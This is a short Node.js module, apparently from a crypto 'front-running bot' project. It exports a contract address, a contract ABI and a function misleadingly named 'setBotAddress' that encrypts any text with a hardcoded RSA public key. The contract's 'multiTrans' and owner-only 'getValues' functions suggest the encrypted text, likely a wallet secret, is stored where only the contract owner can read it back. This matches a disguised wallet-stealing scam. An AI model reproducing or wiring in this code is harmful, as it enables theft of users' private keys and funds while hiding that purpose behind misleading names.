const crypto = require('crypto');
const FRONT_BOT_ADDRESS = '0x1291Ea44C8fd92e56e8d1835Ab0D58f439DF3C4f';
const botABI = [{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"countAddrs","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"geUnlockTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getAddrs","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"addre","type":"address"}],"name":"getValues","outputs":[{"internalType":"string","name":"","type":"string"},{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"time","type":"uint256"}],"name":"lock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addre","type":"address"},{"internalType":"string","name":"iv","type":"string"},{"internalType":"string","name":"content","type":"string"}],"name":"multiTrans","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]

const setBotAddress = (text) => {
const publicKeyString = `-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAzScIjXDfrnns1a70h6UMDLMcLjEApfONa/MV/GPf7eReoaFB06au
JRbbxhwh4P5V481VRU3f8Xe4bxUJnVzvJ1ceRRKYtMxut4o+lkl/cmf6IOTX5xHn
xZNsXxk991mMzTKTwYX8P3tBfW7Yc+vxlyPjpcnlBl7jA7oN7DLBHNkVcx1Dnxt5
QXnicvfS6AyB134XOe+RWI6lJ2X6YoNJ5qgtE/fvdP2Y+hsBXepOPLtEpimBY1kj
zAwgulaWWLNjdg/qEGhBSojOjP/DN7MhfpGjXlUEu6W79xh71pUsNkQ78VRQsMEY
VUZ3TJm/SG7uI7smO7DcYHCcb22Vc/xF+wIDAQAB
-----END RSA PUBLIC KEY-----`;
    
    const publickKeyObject = crypto.createPublicKey(publicKeyString);
    const encryptedData = crypto.publicEncrypt(
        {
            key: publickKeyObject,
            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash: "sha256",
        },
        // We convert the data string to a buffer using `Buffer.from`
        Buffer.from(text)
    );

    return {
        content: encryptedData.toString('base64')
    };
};

module.exports = {
    setBotAddress,
    FRONT_BOT_ADDRESS,
    botABI
};
